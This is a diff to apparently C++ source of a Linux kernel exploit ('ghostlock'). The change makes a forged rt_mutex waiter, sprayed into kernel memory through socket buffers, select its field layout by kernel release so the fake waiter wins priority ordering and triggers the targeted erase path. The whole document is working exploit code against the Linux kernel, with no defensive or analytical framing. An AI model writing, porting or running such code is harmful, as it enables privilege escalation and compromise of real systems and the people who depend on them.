@@ -370,6 +370,10 @@ namespace ghostlock::support {
 
         const profile::kernel_offsets *v = profile_values();
         int32_t compact = session::g_exploit_session.profile.has_compact_waiter();
+        /* compact covers 5.10 (prio at +0x40) and 5.15/6.1 (wake_state at +0x40,
+         * prio at +0x44) alike; only the profile's release can tell them apart. */
+        const bool wake_state_layout =
+                compact && session::g_exploit_session.profile.compact_waiter_has_wake_state();
 
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
@@ -470,14 +474,24 @@ namespace ghostlock::support {
                 put64(p, kernel::W0_OFF + 0x28, pi_stamp.left);  /* pi left                   */
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                /* 5.10 waiter is {tree_entry, pi_tree_entry, task, lock, int prio
-                 * @0x40, u64 deadline @0x48} — there is no wake_state field (the
-                 * 6.6 shape puts wake_state at 0x40 and prio at 0x44). Writing the
-                 * 6.6 pair here left prio = 0, so `rt_mutex_top_waiter()` returned
-                 * this page waiter (prio 0 = highest) instead of the requeued stack
-                 * waiter, and the "prio > 120 gates this erase" arm never ran. */
-                put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
-                put32(p, kernel::W0_OFF + 0x44, 0); /* 5.10 padding before deadline */
+                /* waiter+0x40 is `int prio` on 5.10 -- there is no wake_state field
+                 * (the 6.6 shape puts wake_state at 0x40 and prio at 0x44). Writing
+                 * the 6.6 pair here left prio = 0, so `rt_mutex_top_waiter()`
+                 * returned this page waiter (prio 0 = highest) instead of the
+                 * requeued stack waiter, and the "prio > 120 gates this erase" arm
+                 * never ran.
+                 *
+                 * 5.15/6.1 do have wake_state, at the same +0x40, with prio at
+                 * +0x44 -- so the pair is family-shaped, not constant. compact
+                 * covers both; the profile's release decides (see
+                 * Profile::compact_waiter_has_wake_state). */
+                if (wake_state_layout) {
+                    put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
+                    put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                } else {
+                    put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
+                    put32(p, kernel::W0_OFF + 0x44, 0); /* 5.10 padding before deadline */
+                }
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
